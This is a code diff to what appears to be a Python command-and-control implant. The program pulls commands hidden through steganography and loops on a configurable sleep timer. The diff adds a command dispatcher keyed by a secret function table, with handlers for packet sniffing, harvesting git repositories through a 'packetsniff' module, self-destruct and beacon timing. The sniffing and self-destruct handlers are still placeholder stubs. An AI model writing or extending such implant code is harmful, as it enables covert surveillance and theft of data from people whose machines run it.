@@ -7,6 +7,7 @@ from stegano.lsbset import generators
 from cryptography.fernet import Fernet
 from os.path import exists
 import os
+import packetsniff
 
 import time
 import json
@@ -38,6 +39,36 @@ def fetch_command():
         command = None
     return command
 
+def parse_command(command):
+    tokens = command.split(" ")
+    if len(tokens) < 1:
+        return
+    if tokens[0] in secrets["FUNC_TABLE"].keys():
+        keyphrase = secrets["FUNC_TABLE"][tokens[0]]
+    else:
+        print("invalid command")
+        return
+    
+    if keyphrase == "sniff":
+        if len(tokens) < 2:
+            print('missing arguments')
+            return
+        #insert sniff toggle here
+    elif keyphrase == "repos":
+        packetsniff.get_git_repos()
+    elif keyphrase == "sd":
+        if len(tokens) < 2:
+            print('missing arguments')
+            return
+        #insert self destruct code here
+    elif keyphrase == "setsleep":
+        if len(tokens) < 2:
+            print('missing arguments')
+            return
+        global SLEEP_TIME
+        SLEEP_TIME = int(tokens[1])
+        print(f'Set SleepTime to {SLEEP_TIME}')
+
 while True:
     time.sleep(SLEEP_TIME)
 
@@ -47,6 +78,7 @@ while True:
 
     if command is not None:
         print(f'Command recieved! {command}')
+        parse_command(command)
     else:
         print('Nothing found')
 
